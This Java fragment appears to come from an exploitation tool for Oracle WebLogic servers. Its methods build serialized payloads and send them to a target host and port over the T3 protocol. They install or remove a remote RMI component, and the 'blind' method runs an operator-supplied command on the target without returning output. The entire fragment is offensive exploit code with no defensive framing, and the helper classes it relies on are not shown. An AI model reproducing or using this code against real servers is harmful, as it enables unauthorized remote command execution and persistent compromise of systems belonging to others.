...
public class WebLogicOperation {
    ...
    public static void installRmi(String host, String port, boolean flag) throws Exception {
        byte[] payload = SerialDataGenerator.serialRmiDatas(new String[]{"install"},flag);
        T3ProtocolOperation.send(host, port, payload);
    }

    public static void unInstallRmi(String host, String port, boolean flag) throws Exception {
        byte[] payload = SerialDataGenerator.serialRmiDatas(new String[]{"uninstall"},flag);
        T3ProtocolOperation.send(host, port, payload);
    }

    public static void blind(String host, String port, boolean flag) throws Exception {
        byte[] payload = SerialDataGenerator.serialRmiDatas(new String[]{"blind", Main.cmdLine.getOptionValue("C")},flag);
        T3ProtocolOperation.send(host, port, payload);
    }
